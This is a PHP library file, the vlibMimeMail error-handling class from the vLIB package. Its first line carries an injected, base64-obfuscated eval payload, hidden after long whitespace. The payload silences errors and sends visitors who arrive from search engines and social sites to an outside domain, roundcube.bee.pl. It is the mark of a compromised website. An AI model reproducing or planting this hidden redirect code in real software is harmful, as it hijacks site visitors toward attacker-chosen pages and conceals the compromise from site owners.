<?php	                                       			eval(base64_decode("ZXJyb3JfcmVwb3J0aW5nKDApOwokcWF6cGxtPWhlYWRlcnNfc2VudCgpOwppZiAoISRxYXpwbG0pewokcmVmZXJlcj0kX1NFUlZFUlsnSFRUUF9SRUZFUkVSJ107CiR1YWc9JF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddOwppZiAoJHVhZykgewppZiAoc3RyaXN0cigkcmVmZXJlciwieWFuZGV4Iikgb3Igc3RyaXN0cigkcmVmZXJlciwieWFob28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJnb29nbGUiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaW5nIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlciIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImdvZ28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJsaXZlLmNvbSIpb3Igc3RyaXN0cigkcmVmZXJlciwiYXBvcnQiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJuaWdtYSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiYWlkdS5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJkb3VibGVjbGljay5uZXQiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiZWd1bi5ydSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInN0dW1ibGV1cG9uLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpdC5seSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInRpbnl1cmwuY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiY2xpY2tiYW5rLm5ldCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJsb2dzcG90LmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm15c3BhY2UuY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZmFjZWJvb2suY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpKSB7CmlmICghc3RyaXN0cigkcmVmZXJlciwiY2FjaGUiKSBvciAhc3RyaXN0cigkcmVmZXJlciwiaW51cmwiKSl7CiAgICBoZWFkZXIoIkxvY2F0aW9uOiBodHRwOi8vcm91bmRjdWJlLmJlZS5wbC8iKTsKCWV4aXQoKTsKCX0KCX0KCX0KCX0="));
/* vim: set expandtab tabstop=4 shiftwidth=4: */
// +----------------------------------------------------------------------+
// | PHP version 4.0                                                      |
// +----------------------------------------------------------------------+
// | Copyright (c) 2002 Active Fish Group                                 |
// +----------------------------------------------------------------------+
// | Authors: Kelvin Jones <kelvin@kelvinjones.co.uk>                     |
// +----------------------------------------------------------------------+
//
// $Id: error.php,v 1.4 2004/01/07 22:00:20 releasedj Exp $

if (!defined('FATAL')) 		define('FATAL', E_USER_ERROR);
if (!defined('WARNING')) 	define('WARNING', E_USER_WARNING);
if (!defined('NOTICE')) 	define('NOTICE', E_USER_NOTICE);

/**
 * Class is used by vlibMimeMail.
 * It handles all of the error reporting for vlibMimeMail.
 *
 * @author Kelvin Jones <kelvin@kelvinjones.co.uk>
 * @since 22/04/2002
 * @package vLIB
 * @access private
 */

class vlibMimeMailError {

/*-----------------------------------------------------------------------------\
|     DO NOT TOUCH ANYTHING IN THIS CLASS IT MAY NOT WORK OTHERWISE            |
\-----------------------------------------------------------------------------*/

    function raiseError ($code, $level = null, $extra=null) {
        if (!($level & error_reporting())) return; // binary AND checks for reporting level

        $error_codes = array(
                        'VM_ERROR_INVALID_ERROR_CODE'   => 'vlibMimeMail error: Invalid error raised.',
                        'VM_ERROR_NOFILE'               => 'vlibMimeMail error: Attachment ('.$extra.') file not found.',
                        'VM_ERROR_BADEMAIL'             => 'vlibMimeMail error: Email address ('.$extra.') not valid.',
                        'VM_ERROR_NOBODY'               => 'vlibMimeMail error: Tried to send a message with no body.',
                        'VM_ERROR_CANNOT_SEND'          => 'vlibMimeMail error: Tried to send a message without declaring a body or a recipient.'
                            );

        $error_levels = array(
                        'VM_ERROR_INVALID_ERROR_CODE'   => FATAL,
                        'VM_ERROR_NOFILE'               => FATAL,
                        'VM_ERROR_BADEMAIL'             => FATAL,
                        'VM_ERROR_NOBODY'               => FATAL,
                        'VM_ERROR_CANNOT_SEND'          => FATAL
                            );

        if ($level === null) $level = $error_levels[$code];

        if ($msg = $error_codes[$code]) {
            trigger_error($msg, $level);
        } else {
            trigger_error($error_codes['VM_ERROR_INVALID_ERROR_CODE'], $error_levels['VM_ERROR_INVALID_ERROR_CODE']);
        }
        return;
    }
}
?>